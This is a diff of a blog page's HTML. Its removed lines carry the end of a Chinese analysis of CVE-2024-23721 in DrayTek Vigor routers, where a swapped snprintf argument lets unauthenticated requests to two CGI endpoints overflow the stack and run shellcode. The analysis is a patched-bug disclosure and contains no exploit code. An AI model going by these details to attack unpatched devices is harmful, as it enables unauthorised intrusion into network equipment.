...</span></span><br></pre></td></tr></table></figure>
-
-<p>可以看到这是一个非常简单的漏洞，当用户请求 <code>/cvmcfgupload</code> 或者 <code>/apmcfgupload</code> 时，代码尝试在 GET 参数中找到 session，如果存在的话，在 <code>[1]</code> 处使用 snprintf 将其拷贝到栈缓冲区。</p>
-<p>然而 snprintf 的函数定义为</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">snprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure>
-
-<p>其中第二个参数应该是最大长度，但开发者错误的将其设置为格式化字符串 <code>%s</code>，这导致两个问题，栈溢出和 Format string 漏洞。</p>
-<p><code>cvmcfgupload</code> 和 <code>apmcfgupload</code> 两个接口不需要权限即可访问，且 cgi 程序没有开启 Canary、NX 等保护措施，栈溢出控制返回地址之后可以直接跳转到 stack 来执行 shellcode，允许攻击者未授权在设备上执行任意代码。新版本在 <code>[2]</code> 处调换了参数位置，完成对漏洞的修复。</p>
-<p>目前官方已经修复该漏洞，建议使用该设备的用户及时更新。</p>
-<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>此类参数位置错误，以及对于不安全函数的使用在源码检查或编译阶段就应该被发现并纠正，希望开发者可以重视软件安全，防止恶意攻击造成用户隐私信息泄露和财产损失。</p>
-
-    
-
-    
-    <div class="page-reward">
-      <a href="javascript:void(0);" class="page-reward-btn tooltip-top" target="_self">
-        <div class="tooltip tooltip-east">
-          <span class="tooltip-item">
-            赏
-          </span>
-          <span class="tooltip-content">
-            <span class="tooltip-text">
-              <span class="tooltip-inner">
-                <p class="reward-p"><i class="icon icon-quo-left"></i>Buy me a cup of coffee~<i
-                    class="icon icon-quo-right"></i></p>
-                <div class="reward-box">
-                  
-                  
-                  <div class="reward-box-item">
-                    <img class="reward-img" src="/img/w.png">
-                    <span class="reward-type">微信</span>
-                  </div>
-                  
-                </div>
-              </span>
-            </span>
-          </span>
-        </div>
-      </a>
-    </div>
-    
-
-    
-    <div class="declare"> 
-      <ul class="post-copyright">
-        <li>
-          <strong>本文作者：</strong>
-          CataLpa
-        </li>
-        <li>
-          <strong>本文链接：</strong>
-          <a href="https://wzt.ac.cn/2024/08/12/CVE-2024-23721/" title="Draytek Vigor 3910 &amp; 2960 漏洞分析" target="_blank">https://wzt.ac.cn/2024/08/12/CVE-2024-23721/</a>
-        </li>
-        
-        <li>
-          <strong>版权声明： </strong>
+        <div class="article-info info-on-right">
           
-          <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="https://i.creativecommons.org/l/by-sa/4.0/88x31.png" /></a><br />本作品采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a>进行许可。
-        </li>
-        
-      </ul>
-    </div>
-    
+          
 
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
+        </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-
-<nav id="article-nav">
-  
-    <a href="/2024/09/05/sonicwall_dec/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          SonicOS 固件解密 (2)
-        
-      </div>
-    </a>
   
   
-    <a href="/2024/04/02/fortigate_debug_env2/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">搭建 FortiGate 调试环境 (二)</div>
-      <i class="icon-circle-right"></i>
-    </a>
+    </div></section>
   
-</nav>
 
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-        <div class="toc-container tooltip-left">
-            <i class="icon-font icon-category"></i>
-            <div class="tooltip tooltip-east">
-                <span class="tooltip-item">
-                </span>
-                <span class="tooltip-content">
-                    <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-23721"><span class="toc-number">1.</span> <span class="toc-text">CVE-2024-23721</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vigor-2960-%E9%9D%99%E9%BB%98%E4%BF%AE%E5%A4%8D%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">Vigor 2960 静默修复漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="toc-number">3.</span> <span class="toc-text">写在最后</span></a></li></ol>
-                    </div>
-                </span>
-            </div>
-        </div>
-        
-    </div>
-</aside>
-
-
-
-
-
-
-
-
-
-
-
-
+    
 
 
           </div>
@@ -431,8 +248,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
-		isArchive: false,
+		isPost: false,
+		isArchive: true,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true,
